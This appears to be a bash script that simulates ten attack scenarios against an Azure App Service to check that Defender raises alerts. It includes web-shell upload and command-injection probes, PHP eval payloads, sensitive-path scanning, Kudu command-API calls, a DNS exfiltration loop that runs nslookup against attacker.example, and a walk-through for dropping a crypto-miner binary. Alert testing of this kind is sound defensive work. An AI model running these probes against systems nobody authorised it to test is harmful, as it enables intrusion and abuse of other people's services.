#!/usr/bin/env bash
# Defender for App Service — S-APP-01..10
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$SCRIPT_DIR/lib/common.sh"
confirm_safe

[[ -n "$APP_NAME" ]] || { err "APP_NAME not discovered"; exit 1; }
APP_URL="https://${APP_NAME}.azurewebsites.net"
SCM_URL="https://${APP_NAME}.scm.azurewebsites.net"

s01() { scenario_header S-APP-01 "Web shell upload via Kudu" T1505.003
  warn "Requires deployment credentials; demonstrating via UA only here."
  curl -s -o /dev/null -w "%{http_code}\n" -A "diag.aspx-uploader" "$SCM_URL/api/vfs/site/wwwroot/diag.aspx?content=ASPX-SHELL" || true
}

s02() { scenario_header S-APP-02 "Process execution from web app" T1059
  warn "Requires a deliberately vulnerable demo app; sending probe path."
  curl -s -o /dev/null -w "%{http_code}\n" "$APP_URL/run?cmd=whoami" || true
}

s03() { scenario_header S-APP-03 "Vulnerability scanner pattern" T1046
  for path in /admin /backup /.env /wp-login.php /phpmyadmin /.git/config /server-status; do
    curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" "${APP_URL}${path}" || true
  done
}

s04() { scenario_header S-APP-04 "Phishing content uploaded" T1566
  warn "Walk-through: upload login.html via Kudu /vfs API."
}

s05() { scenario_header S-APP-05 "DNS exfil pattern from app (walk-through)" T1048
  info "Configure a Function/web job to: for i in 1..5; nslookup \$RANDOM.\$(date +%s).attacker.example"
}

s06() { scenario_header S-APP-06 "Mining binary placed (walk-through)" T1496
  info "Drop a file named 'xmrig' into D:\\home\\site\\wwwroot via Kudu. We won't execute."
}

s07() { scenario_header S-APP-07 "Outbound to TI-listed domain (walk-through)" T1071
  info "From Kudu: Invoke-WebRequest http://<TI-listed-domain>"
}

s08() { scenario_header S-APP-08 "Suspicious PHP eval pattern" T1059
  curl -s -o /dev/null -w "%{http_code}\n" "${APP_URL}/?x=phpinfo();" || true
  curl -s -o /dev/null -w "%{http_code}\n" "${APP_URL}/index.php?cmd=system('id')" || true
}

s09() { scenario_header S-APP-09 "App Service accessed from Tor" T1090.003
  if have torsocks; then
    torsocks curl -s -o /dev/null -w "%{http_code}\n" "$APP_URL/"
  else
    warn "torsocks not installed; open $APP_URL/ in Tor Browser."
  fi
}

s10() { scenario_header S-APP-10 "Suspicious Kudu / SCM access" T1059
  curl -s -o /dev/null -w "%{http_code}\n" -X POST "$SCM_URL/api/command" \
       -H "Content-Type: application/json" \
       -d '{"command":"whoami","dir":"site\\wwwroot"}' || true
}

dispatch "${1:?scenario number required (01..10)}"
